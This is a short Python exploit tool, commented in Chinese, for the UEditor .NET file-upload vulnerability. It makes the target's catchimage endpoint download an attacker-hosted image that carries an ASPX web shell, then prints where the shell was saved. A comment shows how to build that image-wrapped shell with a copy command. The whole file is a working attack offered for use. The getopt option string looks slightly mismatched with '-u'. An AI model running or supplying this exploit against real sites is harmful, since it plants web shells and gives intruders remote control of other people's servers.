#coding=utf-8
# ueditor .net版本文件上传利用工具
# 图片马制作方法 copy 1.png /b + 1.aspx /a 2.png
# Blog:http://www.end520.com/
import json
import requests
import urllib.parse
import sys, getopt
def main(argv):
   urls = ''
   datas = ''
   Tips = 'ueditor.py -u <url http://xxx.com/ueditor/net/controller.ashx?action=catchimage> -shell <shell path http://xxx.com/1.png?.aspx>'
   try:
      opts, args = getopt.getopt(argv,"hi:s:",["url=","shell="])
   except getopt.GetoptError:
      print ('1')
      sys.exit(2)
   for opt, arg in opts:
      if opt == '-h':
         print (Tips)
         sys.exit()
      elif opt in ("-u", "--url"):
         urls = arg
      elif opt in ("-s", "--shell"):
         datas = arg
   url = urls
   data = {"source[]": datas}
   try:
    parsed = urllib.parse.urlparse(url)
    domin = parsed.scheme + '://' + parsed.netloc + '/'
    headers = {'Referer': domin}
    res = requests.post(url=url, data=data, headers=headers)
    dictinfo = json.loads(res.text)
   except requests.exceptions.MissingSchema:
       print(Tips)
       sys.exit(2)
   except json.decoder.JSONDecodeError:
       print('地址错误或漏洞不存在')
       sys.exit(2)

   if res.status_code == 200 and dictinfo['state'] == 'SUCCESS':
       shell = dictinfo['list'][0]['url']
       print('SHELL PATH:' + shell)
   else:
       print('Error!')


if __name__ == "__main__":
   main(sys.argv[1:])